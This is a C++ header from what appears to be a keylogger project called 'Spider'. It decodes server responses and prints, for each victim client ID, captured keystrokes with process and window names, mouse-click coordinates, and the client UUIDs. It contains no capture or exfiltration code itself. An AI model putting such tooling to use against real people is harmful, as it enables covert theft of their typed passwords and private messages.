//
// Created by hippolyteb on 11/15/16.
//

#ifndef MESSAGEDESERIALIZER_HPP
#define MESSAGEDESERIALIZER_HPP

#include <iostream>
#include "protobufMessages/SpiderEnvelop.pb.h"
#include "protobufMessages/GetKeylogCommandResponse.pb.h"
#include "protobufMessages/ListUUIDSCommandResponse.pb.h"
#include "protobufMessages/GetMouselogCommandResponse.pb.h"
#include "protobufMessages/SpiderMouseEvent.pb.h"

class MessageDeserializer {
public:
    static void PrintResponse(SpiderEnveloppe &enveloppe) {
        std::string type = enveloppe.payloadtype();

        if (type == "GetKeylogCommandResponse") {
            GetKeylogCommandResponse response;
            enveloppe.payload().UnpackTo(&response);
            PrintKeylog(enveloppe.clientid(), response);
        }
        else if (type == "ListUUIDSCommandResponse"){
            ListUUIDSCommandResponse response;
            enveloppe.payload().UnpackTo(&response);
            PrintUUIDS(response);
        }
        else if (type == "GetMouselogCommandResponse"){
            GetMouselogCommandResponse response;
            enveloppe.payload().UnpackTo(&response);
            PrintMouselog(enveloppe.clientid(), response);
        } else {
            std::cout << "Server responded with an unknown message type \"" << type << "\"" << std::endl;
        }
    }

private:
    static std::string getEventName(int event){
        if (event == SpiderMouseEvent_MouseEventType_RBUTTON_CLICK)
            return "RIGHT BUTTON CLICK";
        else if (event == SpiderMouseEvent_MouseEventType_LBUTTON_CLICK)
            return "LEFT BUTTON CLICK";
        else if (event == SpiderMouseEvent_MouseEventType_MBUTTON_CLICK)
            return "MIDDLE BUTTON CLICK";
        else if (event == SpiderMouseEvent_MouseEventType_MBUTTON_UP)
            return "MIDDLE BUTTON UP";
        else if (event == SpiderMouseEvent_MouseEventType_MBUTTON_DOWN)
            return "MIDDLE BUTTON DOWN";
        else
            return "UNKNOWN";
    }

    static void PrintMouselog(const std::string &clientId, GetMouselogCommandResponse &response) {
        std::cout << "Mouselog for client with ID [" << clientId << "] : " << std::endl;
        for (int i = 0; i < response.keylog_size(); ++i) {
            SpiderMouseEvent payload;
            payload = response.keylog(i);

            std::cout << "> [Event: " << getEventName(payload.type()) << " X : " << payload.x() << "; Y : " << payload.y() << std::endl;
        }
        std::cout << "TOTAL of " << response.keylog_size() << " entries for client with ID [\"" << clientId << "\"]" << std::endl;
    }

    static void PrintKeylog(const std::string &clientId, GetKeylogCommandResponse &response) {
        std::cout << "Keylog for client with ID [" << clientId << "] : " << std::endl;
        for (int i = 0; i < response.keylog_size(); ++i) {
            SpiderKeyLoggingPayload payload;
            payload = response.keylog(i);

            if (payload.context().processname() != "" || payload.context().windowsname() != "")
                std::cout << "> Context changed : " << "[Process:\"" <<payload.context().processname() << "\"" << " Window:\"" << payload.context().windowsname() << "\"]" << std::endl;
            if (payload.plaintextkeylog() != "")
                std::cout << "==> " << payload.plaintextkeylog() << std::endl;
        }
        std::cout << "TOTAL of " << response.keylog_size() << " entries for client with ID [\"" << clientId << "\"]" << std::endl;
    }

    static void PrintUUIDS(ListUUIDSCommandResponse &response) {
        std::cout << "UUIDS : " << std::endl;
        for (int i = 0; i < response.uuid_size(); ++i) {
            std::cout << "> " << response.uuid(i) << std::endl;
        }
        std::cout << "TOTAL of " << response.uuid_size() << " entries for UUIDS" << std::endl;
    }
};

#endif //MESSAGEDESERIALIZER_HPP
